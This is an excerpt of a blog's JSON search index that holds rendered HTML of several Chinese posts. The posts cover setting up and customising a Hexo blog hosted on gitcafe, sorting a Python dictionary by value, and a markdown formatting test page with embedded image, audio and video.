class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sineCosine</span><span class=\"params\">(a, b, c)</span> </span>&#123;</span><br><span class=\"line\">\tsa = <span class=\"built_in\">Math</span>.sin(a * dtr);</span><br><span class=\"line\">\tca = <span class=\"built_in\">Math</span>.cos(a * dtr);</span><br><span class=\"line\">\tsb = <span class=\"built_in\">Math</span>.sin(b * dtr);</span><br><span class=\"line\">\tcb = <span class=\"built_in\">Math</span>.cos(b * dtr);</span><br><span class=\"line\">\tsc = <span class=\"built_in\">Math</span>.sin(c * dtr);</span><br><span class=\"line\">\tcc = <span class=\"built_in\">Math</span>.cos(c * dtr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"hexo使用","url":"http://ohroot.com/2014/09/18/hexo使用/","content":"<p>记录下hexo配合gitcafe搭建博客的林林总总，做个备忘录把<br><a id=\"more\"></a></p>\n<h2 id=\"前言\">前言</h2><p>  hexo需要Git和Node.js的支持，本文不详细讲述这两个方面的技术。只做简单介绍把。博客系统“托管在”gitcafe上面，这里涉及git pages的概念，读者可以去网上查阅相关概念。博客通过使用markdown语法编辑，然后hexo生成静态博客，再发布到gitcafe的项目中。通过git pages的支持，博客就可以被正常浏览了。</p>\n<h2 id=\"Get_ready！\">Get ready！</h2><p>  搭建博客之前首先要学会使用git，强烈推荐大家使用命令行方式的。linux系统一般集成了这个常用工具，windows平台下推荐<a href=\"http://msysgit.github.io/\" target=\"_blank\" rel=\"external\">msysgit</a>。图形界面的怎么都感觉用着别扭。</p>\n<p>然后学习方面推荐几篇文章把：<br>关于git使用：<br>  <a href=\"http://blog.jobbole.com/25775/\" target=\"_blank\" rel=\"external\">Git详解之一：Git起步</a><br>  <a href=\"http://blog.jobbole.com/25808/\" target=\"_blank\" rel=\"external\">Git详解之二：Git基础</a><br>  <a href=\"http://blog.jobbole.com/25877/\" target=\"_blank\" rel=\"external\">Git详解之三：Git分支</a><br>  <a href=\"http://blog.jobbole.com/25944/\" target=\"_blank\" rel=\"external\">Git详解之四：服务器上的Git</a><br>  <a href=\"http://blog.jobbole.com/25660/\" target=\"_blank\" rel=\"external\">Git详解之五：分布式Git</a><br>  <a href=\"http://blog.jobbole.com/26112/\" target=\"_blank\" rel=\"external\">Git详解之六：Git工具</a><br>  <a href=\"http://blog.jobbole.com/26131/\" target=\"_blank\" rel=\"external\">Git详解之七：自定义Git</a><br>  <a href=\"http://blog.jobbole.com/26198/\" target=\"_blank\" rel=\"external\">Git详解之八：Git与其他系统</a><br>  <a href=\"http://blog.jobbole.com/26209/\" target=\"_blank\" rel=\"external\">Git详解之九：Git内部原理</a><br>关于markdownu用法的简单说明：<a href=\"http://www.jianshu.com/p/q81RER\" target=\"_blank\" rel=\"external\">献给写作者的 Markdown 新手指南</a><br>markdown编辑器：<a href=\"https://stackedit.io/editor\" target=\"_blank\" rel=\"external\">stackedit</a></p>\n<h2 id=\"搭建博客\">搭建博客</h2><p>下面就开始搭建博客，搭建博客涉及到一点node.js的知识，但是设计较少，只需要把环境搭好就差不多了，更多了解请自行查阅相关资料。<br><a href=\"http://nodejs.org/\" target=\"_blank\" rel=\"external\">node.js</a>官网有node.js安装指南，Just Follow！也附上官方的<a href=\"http://hexo.io/docs/\" target=\"_blank\" rel=\"external\">hexo</a>相关介绍，你要做的还是Read and Follow！</p>\n<p><strong> 初始化 </strong><br>    <code>npm install hexo -g</code> </p>\n<p>  npm就是node.js的包管理器，其实和python的包管理是差不多的，这一步的操作类似于安装了hexo这个包。</p>\n<p><strong> 执行init命令初始化hexo到你指定的目录： </strong><br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init blog</span><br><span class=\"line\">cd blog</span><br><span class=\"line\">npm <span class=\"operator\"><span class=\"keyword\">install</span></span><br><span class=\"line\">hexo <span class=\"keyword\">server</span></span></span><br></pre></td></tr></table></figure></p>\n<p>到这里基本工作就完成了，你的初始工作目录下的blog目录就是你的博客目录了，以后每次执行hexo相关的命令都要切到blog目录下面。</p>\n<p><strong> 生成静态页面 </strong></p>\n<p>cd 到你的init目录，执行如下命令，生成静态页面至hexo\\public\\目录。<br>    <code>hexo generate</code></p>\n<p><strong> 新建文章 </strong><br>    <code>hexo new [layout] &quot;postName&quot; #新建文章</code></p>\n<p><code>[layout]</code>指的是blog/scaffolds目录下的四种博客模板之一，也可以不指定，默认为post。</p>\n<hr>\n<h2 id=\"hexo常用命令\">hexo常用命令</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init [folder] <span class=\"comment\"># 初始化一个网站</span></span><br><span class=\"line\">$ hexo new [layout] &lt;title&gt; <span class=\"comment\"># 创建新文章</span></span><br><span class=\"line\">$ hexo generate <span class=\"comment\"># 生成静态网页</span></span><br><span class=\"line\">$ hexo server <span class=\"comment\"># 启动服务，以便本地查看</span></span><br><span class=\"line\">$ hexo deploy <span class=\"comment\"># 发布你的blog</span></span><br><span class=\"line\">$ hexo migrate wordpress wordpress.<span class=\"number\">2013</span>-<span class=\"number\">10</span>-<span class=\"number\">03</span>.xml <span class=\"comment\"># 从wp迁移，效果差，仍需要手动调整</span></span><br><span class=\"line\">$ hexo clean <span class=\"comment\"># 清理缓存(db.json)和生成的文件(public)</span></span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"hexo美化\">hexo美化</h2><p>这里只介绍简单的几种美化方面的方法技巧，网上这方面的文章很多，爱折腾的你可以自己去倒腾，让你的博客更美。当然好的东西别忘了和我分享。</p>\n<h3 id=\"为博客添加“多说”评论\">为博客添加“多说”评论</h3><ol>\n<li>在多说进行注册，获得通用代码。</li>\n<li>将通用代码粘贴到<code>themes\\light\\layout\\_partial\\comment.ejs</code>里面，如下：</li>\n</ol>\n<figure class=\"highlight erb\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"xml\"></span>&lt;%<span class=\"ruby\"> <span class=\"keyword\">if</span> ( page.comments)&#123; </span>%&gt;<span class=\"xml\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">section</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"comment\"</span>&gt;</span></span><br><span class=\"line\">通用代码</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">section</span>&gt;</span></span><br><span class=\"line\"></span>&lt;%<span class=\"ruby\"> &#125; </span>%&gt;<span class=\"xml\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"添加翻页\">添加翻页</h3><p>在多说评论框<code>&lt;% if ( page.comments){ %&gt;</code>代码的前面<br><figure class=\"highlight erb\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"title\">nav</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"pagination\"</span> &gt;</span></span><br><span class=\"line\">  </span>&lt;%<span class=\"ruby\"> <span class=\"keyword\">if</span> (page.prev) &#123; </span>%&gt;<span class=\"xml\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"</span></span></span>&lt;%-<span class=\"ruby\"> config.root </span>%&gt;<span class=\"xml\"><span class=\"tag\"><span class=\"value\"></span></span></span>&lt;%-<span class=\"ruby\"> page.prev.path </span>%&gt;<span class=\"xml\"><span class=\"tag\"><span class=\"value\">\"</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"alignleft prev\"</span> &gt;</span></span>&lt;%=<span class=\"ruby\"> _<span class=\"number\">_</span>(<span class=\"string\">'prev'</span>) </span>%&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></span><br><span class=\"line\">  </span>&lt;%<span class=\"ruby\"> &#125; </span>%&gt;<span class=\"xml\"></span><br><span class=\"line\">  </span>&lt;%<span class=\"ruby\"> <span class=\"keyword\">if</span> (page.<span class=\"keyword\">next</span>) &#123; </span>%&gt;<span class=\"xml\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"</span></span></span>&lt;%-<span class=\"ruby\"> config.root </span>%&gt;<span class=\"xml\"><span class=\"tag\"><span class=\"value\"></span></span></span>&lt;%-<span class=\"ruby\"> page.<span class=\"keyword\">next</span>.path </span>%&gt;<span class=\"xml\"><span class=\"tag\"><span class=\"value\">\"</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"alignright next\"</span> &gt;</span></span>&lt;%=<span class=\"ruby\"> _<span class=\"number\">_</span>(<span class=\"string\">'next'</span>) </span>%&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></span><br><span class=\"line\">  </span>&lt;%<span class=\"ruby\"> &#125; </span>%&gt;<span class=\"xml\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"clearfix\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">nav</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分享功能\">分享功能</h3><p>本人不是很喜欢那个分享功能所以直接去掉了<br>在themes\\light\\layout_partial\\article.ejs中想去掉哪个删掉哪个</p>\n<pre><code>&lt;%- <span class=\"function\"><span class=\"title\">partial</span><span class=\"params\">(<span class=\"string\">'post/category'</span>)</span></span> %&gt;\n&lt;%- <span class=\"function\"><span class=\"title\">partial</span><span class=\"params\">(<span class=\"string\">'post/tag'</span>)</span></span> %&gt;\n&lt;%- <span class=\"function\"><span class=\"title\">partial</span><span class=\"params\">(<span class=\"string\">'post/share'</span>)</span></span> %&gt;\n</code></pre><h3 id=\"友情链接\">友情链接</h3><p>在themes/light/layout/_widget中新建名为blogroll.ejs的文件，编辑内容如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"widget tag\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"title\">h3</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"title\"</span>&gt;</span>友情链接<span class=\"tag\">&lt;/<span class=\"title\">h3</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"title\">ul</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"entry\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"title\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"http://baidu.com/\"</span> <span class=\"attribute\">title</span>=<span class=\"value\">\"Baidu\"</span>&gt;</span>Baidu<span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"title\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>在themes/light/_config.yml中，添加如下：<br><figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">widgets:</span><br><span class=\"line\"><span class=\"bullet\">- </span>blogroll</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"添加RSS\">添加RSS</h3><p>hexo提供了RSS的生成插件，需要手动安装和设置。步骤如下：<br>安装RSS插件到本地：<code>npm install hexo-generator-feed --save</code><br>开启RSS功能：在<code>themes/light/_config.yml</code>中，编辑<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">feed</span>:</span><br><span class=\"line\">  <span class=\"attribute\">type</span>: atom</span><br><span class=\"line\">  <span class=\"attribute\">path</span>: atom.xml</span><br><span class=\"line\">  <span class=\"attribute\">limit</span>: <span class=\"number\">20</span></span><br></pre></td></tr></table></figure></p>\n<p>在站点添加链接：<br>在<code>themes/light/layout/_partial/header.ejs</code>中，<code>&lt;ul&gt;&lt;/ul&gt;</code>之间，添加一样代码<code>&lt;li&gt; &lt;a href=&quot;/atom.xml&quot;&gt;RSS&lt;/a&gt; &lt;/li&gt;</code></p>\n<h3 id=\"添加sitemap\">添加sitemap</h3><p>同样的，我们使用hexo提供的插件，方法与添加RSS类似。<br>安装sitemap到本地：<code>npm install hexo-generator-sitemap --save</code><br>开启sitemap功能：编辑<code>themes/light/_config.yml</code>，添加如下代码：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">sitemap</span>:</span><br><span class=\"line\">  <span class=\"attribute\">path</span>: sitemap.xml</span><br></pre></td></tr></table></figure></p>\n<p>访问ohroot.com/sitemap.xml即可看到站点地图。不过，sitemap的初衷是给搜索引擎看的，为了提高搜索引擎对自己站点的收录效果，我们最好手动到google和百度等搜索引擎提交sitemap.xml。</p>\n"},{"title":"python 字典排序","url":"http://ohroot.com/2014/09/18/20140918-1/","content":"<p>python 字典按值排序<br><a id=\"more\"></a></p>\n<p>我们知道在python中字典是无序的，但是实际中我们又需要对字典类型中的键或值进行排序，对字典键进行排序较为简单，本文不详细说明，本文主要讲述按值排序的实现。</p>\n<p>核心代码如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">submitDic2 = sorted(submitDic.iteritems(), key=<span class=\"keyword\">lambda</span> d:d[<span class=\"number\">1</span>], reverse = <span class=\"keyword\">True</span>)</span><br></pre></td></tr></table></figure></p>\n<p>其中submitDic为字典类型，处于未排序状态。submitDic2为排序后状态，为一个有序列表，列表元素为一个元组，按值排序。</p>\n"},{"title":"第一篇-测试","url":"http://ohroot.com/2014/09/18/phototest/","content":"<p>本人测试文档，杂乱不堪，非礼勿视<br><a id=\"more\"></a></p>\n<h1 id=\"一级标题\">一级标题</h1><h2 id=\"二级标题\">二级标题</h2><h3 id=\"三级标题\">三级标题</h3><p><code>中间插入一句代码</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python 代码</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>区块引用</p>\n</blockquote>\n<ul>\n<li>我是列表1</li>\n<li>我是列表2</li>\n<li>我是列表3</li>\n</ul>\n<ol>\n<li>我是数字1</li>\n<li>我是数字2</li>\n<li>我是数字3</li>\n</ol>\n<p>我的<a href=\"http://direwolf.gitcafe.com\" target=\"_blank\" rel=\"external\">博客</a></p>\n<p>参考式连接</p>\n<p>我的博客<a href=\"http://direwolf.gitcafe.com\" target=\"_blank\" rel=\"external\">博客</a></p>\n<p>斜体   <em> 我是斜体 </em><br>加粗   <strong> 我是加粗 </strong></p>\n<h2 id=\"分隔符\">分隔符</h2><hr>\n<hr>\n<p>正文图片<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!<span class=\"attr_selector\">[]</span>(<span class=\"attribute\">http</span>:<span class=\"comment\">//ww2.sinaimg.cn/large/5e8cb366jw1e62o63tkv3j20dh078q5a.jpg)</span></span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://ww2.sinaimg.cn/large/5e8cb366jw1e62o63tkv3j20dh078q5a.jpg\" alt=\"\"></p>\n<p>音乐<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;embed <span class=\"variable\">src=</span><span class=\"string\">\"http://www.xiami.com/widget/0_3515679/singlePlayer.swf\"</span> <span class=\"variable\">type=</span><span class=\"string\">\"application/x-shockwave-flash\"</span> <span class=\"variable\">width=</span><span class=\"string\">\"257\"</span> <span class=\"variable\">height=</span><span class=\"string\">\"33\"</span> <span class=\"variable\">wmode=</span><span class=\"string\">\"transparent\"</span>&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure></p>\n<embed src=\"http://www.xiami.com/widget/0_3515679/singlePlayer.swf\" type=\"application/x-shockwave-flash\" width=\"257\" height=\"33\" wmode=\"transparent\">\n\n<p>视频<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">iframe</span> <span class=\"attribute\">height</span>=<span class=\"value\">498</span> <span class=\"attribute\">width</span>=<span class=\"value\">510</span> <span class=\"attribute\">src</span>=<span class=\"value\">\"http://player.youku.com/embed/XMjI2MjU3MDMy\"</span> <span class=\"attribute\">frameborder</span>=<span class=\"value\">0</span> <span class=\"attribute\">allowfullscreen</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<iframe height=\"498\" width=\"510\" src=\"http://player.youku.com/embed/XMjI2MjU3MDMy\" frameborder=\"0\" allowfullscreen></iframe>"}]